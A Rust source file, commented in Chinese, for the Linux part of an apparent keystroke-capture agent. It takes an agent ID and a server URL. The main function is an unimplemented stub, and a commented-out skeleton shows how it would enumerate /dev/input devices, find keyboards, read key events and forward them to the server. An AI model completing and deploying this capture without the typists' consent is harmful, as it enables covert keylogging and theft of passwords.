#[cfg(target_os = "linux")]
use anyhow::{Context, Result};
use tracing::{debug, info, warn};

use super::KeyEvent;

/// 启动 Linux evdev 捕获
pub async fn start_capture(agent_id: &str, server_url: &str) -> Result<()> {
    info!("启动 Linux evdev 键盘捕获");
    info!("Agent ID: {}", agent_id);
    info!("服务器: {}", server_url);

    // TODO: 实现 evdev 捕获逻辑
    // 1. 枚举所有 /dev/input/event* 设备
    // 2. 找到键盘设备
    // 3. 打开设备文件并读取事件
    // 4. 将事件转换为 KeyEvent 并发送到服务器

    /*
    示例代码框架：

    use evdev::{Device, InputEventKind};

    // 枚举所有输入设备
    for entry in std::fs::read_dir("/dev/input")? {
        let entry = entry?;
        let path = entry.path();

        if let Some(name) = path.file_name() {
            if name.to_str().unwrap().starts_with("event") {
                match Device::open(&path) {
                    Ok(device) => {
                        // 检查是否是键盘设备
                        if is_keyboard_device(&device) {
                            info!("找到键盘设备: {:?}", path);

                            // 开始捕获事件
                            let mut events = device.into_event_stream()?;
                            while let Some(event) = events.next_event().await {
                                match event {
                                    Ok(ev) => {
                                        if let InputEventKind::Key(key) = ev.kind() {
                                            // 转换为 KeyEvent 并发送
                                            let key_event = convert_to_key_event(ev);
                                            send_to_server(key_event).await?;
                                        }
                                    }
                                    Err(e) => warn!("读取事件失败: {}", e),
                                }
                            }
                        }
                    }
                    Err(e) => debug!("无法打开设备 {:?}: {}", path, e),
                }
            }
        }
    }
    */

    warn!("Linux evdev 捕获尚未实现");

    Ok(())
}

// 判断是否是键盘设备
#[cfg(target_os = "linux")]
fn is_keyboard_device(device: &evdev::Device) -> bool {
    // 检查设备是否支持按键输入
    device.supported_keys().map_or(false, |keys| {
        // 如果支持常见的字母键，认为是键盘
        keys.contains(evdev::Key::KEY_A)
    })
}
